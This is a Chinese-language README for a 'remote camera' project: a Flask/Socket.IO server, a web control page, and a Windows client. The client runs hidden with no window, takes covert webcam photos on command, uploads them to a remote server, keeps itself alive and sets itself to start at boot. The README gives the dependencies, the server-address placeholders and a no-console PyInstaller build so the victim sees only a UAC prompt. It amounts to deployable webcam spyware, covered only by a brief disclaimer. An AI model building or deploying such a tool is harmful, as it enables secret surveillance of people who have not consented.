# 远程摄像头
（代码部分有ai写）
## 系统架构

本解决方案实现了通过网页远程控制Windows电脑摄像头拍摄并上传照片的功能，包含以下三个主要组件：

- **客户端**：运行于Windows系统，具备摄像头的电脑
- **服务端**：独立公网Linux服务器，接收指令并存储照片
- **控制端**：网页界面，用于发送拍摄指令和下载照片

## 组件说明

### 1. 服务端 (server.py)

#### 功能
- 提供Web服务，接收客户端连接
- 管理多个客户端连接
- 接收并处理来自网页的拍摄指令，转发至指定客户端
- 接收客户端上传的照片并存储在指定目录
- 提供照片列表和下载功能

#### 配置与运行

**依赖安装**：
```bash
pip install flask flask-socketio python-socketio
```

**运行服务**：
```bash
python server.py
```

**默认配置**：
- 服务地址：0.0.0.0:5000
- 照片存储目录：./photos
- 密钥：your-secret-key（建议修改）(没啥用)

### 2. 客户端 (windows_client.py)

#### 功能
- 后台静默运行，无窗口显示
- 接收来自服务器的拍摄指令
- 调用电脑摄像头进行隐蔽拍摄
- 将拍摄的照片加密后上传至服务器指定位置
- 实现程序后台保活机制，确保持续运行
- 实现开机自启功能

#### 配置

**修改服务器地址**：
在`windows_client.py`文件中修改以下配置：
```python
SERVER_URL = 'http://your-server-ip:5000'  # 替换为你的服务器IP
SOCKET_URL = 'ws://your-server-ip:5000'   # 替换为你的服务器IP
```

**依赖安装**：
```bash
pip install opencv-python pillow requests python-socketio flask-socketio pypiwin32 flask
```

**编译为EXE**：

使用PyInstaller将Python脚本编译为Windows可执行文件：

1. 安装PyInstaller：
```bash
pip install pyinstaller
```

2. 编译命令：
```bash
pyinstaller --onefile --noconsole --name RemoteCameraClient windows_client.py
```

编译参数说明：
- `--onefile`：生成单个可执行文件
- `--noconsole`：不显示控制台窗口
- `--name RemoteCameraClient`：生成的EXE文件名

3. 编译完成后，EXE文件将位于`dist`目录下。

**运行说明**：
- 双击EXE文件，仅显示UAC确认窗口
- 确认后无任何可见界面，完全在后台运行
- 程序会自动设置开机自启
- 日志文件：`client.log`（与EXE同目录）

### 3. 网页界面 (index.html)

#### 功能
- 简洁易用的控制界面
- 显示在线客户端状态
- 提供拍摄按钮，发送拍摄指令
- 显示可下载的照片列表
- 提供照片下载功能

#### 使用方法

1. 确保服务端已正常运行
2. 在浏览器中访问：`http://your-server-ip:5000`
3. 界面将显示服务器状态、在线客户端数量和照片列表
4. 点击"拍摄照片"按钮发送拍摄指令
5. 拍摄完成后，照片会自动显示在照片列表中
6. 点击"下载"按钮可下载对应照片
7. 请将此文件上传到`server.py`同一目录下

## 技术实现细节

### 通信流程
1. 客户端通过WebSocket连接到服务端
2. 控制端（网页）通过HTTP请求向服务端发送拍摄指令
3. 服务端通过WebSocket将拍摄指令转发给所有在线客户端
4. 客户端接收到指令后，调用摄像头拍摄照片
5. 客户端将拍摄的照片通过HTTP POST上传到服务端
6. 服务端将照片保存到指定目录
7. 控制端可通过HTTP请求获取照片列表和下载照片

### 安全性考虑

~~1. **服务端密钥**：修改`server.py`中的`SECRET_KEY`为安全的随机字符串~~（其实没啥用）
2. **网络通信**：建议在生产环境中使用HTTPS和WSS协议
3. **客户端认证**：可根据需要添加客户端认证机制
4. **照片存储**：建议定期清理服务器上的照片，避免占用过多存储空间

## 日志说明

### 客户端日志 (client.log)

日志级别：INFO

主要日志内容：
- 程序启动和停止
- 服务器连接状态
- 摄像头初始化状态
- 照片拍摄和上传结果
- 开机自启设置结果

### 服务端日志

服务端运行时会在控制台输出日志，主要包括：
- 服务器启动信息
- 客户端连接和断开事件
- 照片上传信息


**免责声明**：本项目仅用于学习和合法授权的场景，请勿用于非法用途。使用本项目产生的一切后果由使用者自行承担。

